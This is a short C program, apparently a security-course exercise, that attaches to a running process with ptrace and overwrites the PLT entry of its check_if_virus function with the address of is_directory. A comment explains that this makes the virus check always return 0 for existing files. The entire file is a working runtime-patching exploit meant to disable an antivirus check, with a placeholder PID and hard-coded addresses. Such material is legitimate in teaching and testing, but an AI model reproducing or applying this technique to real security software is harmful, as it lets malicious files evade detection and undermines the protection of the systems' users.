#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

int pid = 0x12345678;
#define IS_DIRECTORY_ADDRESS 0x804878b
#define CHECK_IF_VIRUS_PLT_ADDRESS 0x0804a01c
/*
 * This time we overwrite the plt entry for check_if_virus so that it will call is_directory instead.
 * In doing so the call for check_if_virus will always return 0 for a file that exists
 */
int main() 
{
	if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1)
	{
		perror("attach");
		return -1;
	}

	int status;
	waitpid(pid, &status, 0);
	if(WIFEXITED(status)) {return -1;} 
	ptrace(PTRACE_POKETEXT, pid, CHECK_IF_VIRUS_PLT_ADDRESS, IS_DIRECTORY_ADDRESS);



	if(ptrace(PTRACE_DETACH, pid, NULL, NULL))
	{
		perror("detach");
		return -1;
	}
    return 0;
}
